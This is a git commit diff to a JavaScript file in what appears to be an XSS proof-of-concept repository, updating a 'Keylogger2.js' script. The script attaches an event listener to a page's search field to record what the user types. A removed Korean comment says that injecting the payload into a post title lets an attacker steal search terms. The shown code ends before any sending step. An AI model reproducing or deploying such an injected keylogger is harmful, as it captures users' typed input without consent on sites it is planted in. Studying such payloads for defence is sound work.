055f3dca0d8729cffc3773ea2c178ef0c147c142
JUNG SOON HO <ajsoon98@naver.com>
2025-12-29 12:36:32 +0900

    Update Keylogger2.js

--- XSS_POC/Keylogger/Keylogger2.js
+++ XSS_POC/Keylogger/Keylogger2.js
@@ -1,10 +1,9 @@
-// 글 제목 부분에 Payload를 입력하면 검색어를 탈취할 수 있다.
 const search_word = document.getElementsByName("search_word")[0];
 
 var search_keylog = "";
 
-search_word.addEventListener("keypress", (e) => {
-    search_keylog += e.key;
+search_word.addEventListener("input", (e) => {
+    search_keylog = e.target.value;
 });
 
 const search_btn = document.getElementsByTagName("button")[0];
